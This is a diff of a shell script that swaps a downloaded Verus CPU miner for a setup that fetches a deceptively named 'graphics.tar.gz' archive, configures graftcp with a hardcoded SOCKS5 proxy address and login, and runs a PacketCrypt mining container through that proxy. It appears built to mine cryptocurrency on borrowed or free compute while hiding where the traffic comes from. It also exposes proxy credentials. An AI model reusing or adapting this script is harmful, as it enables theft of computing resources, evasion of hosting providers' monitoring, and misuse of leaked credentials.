@@ -1,12 +1,39 @@
 #!/bin/sh
-wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-PoolHost=stratum+tcp://na.luckpool.net
-Port=3956#xnsub
-PublicVerusCoinAddress=RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe
-WorkerName=$(echo $(shuf -i 1-999 -n 1)-free)
-Threads=122
-#set working directory to the location of this script
-DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-cd $DIR
-./hellminer -c "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" --cpu "${Threads}" "$@" 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+select_proxy_mode=socks5_only 
+socks5 = 103.253.24.243:8080
+socks5_username = woiden_aqua1
+socks5_password = chain
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp docker run thomasjp0x42/packetcrypt ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io | grep goodrate
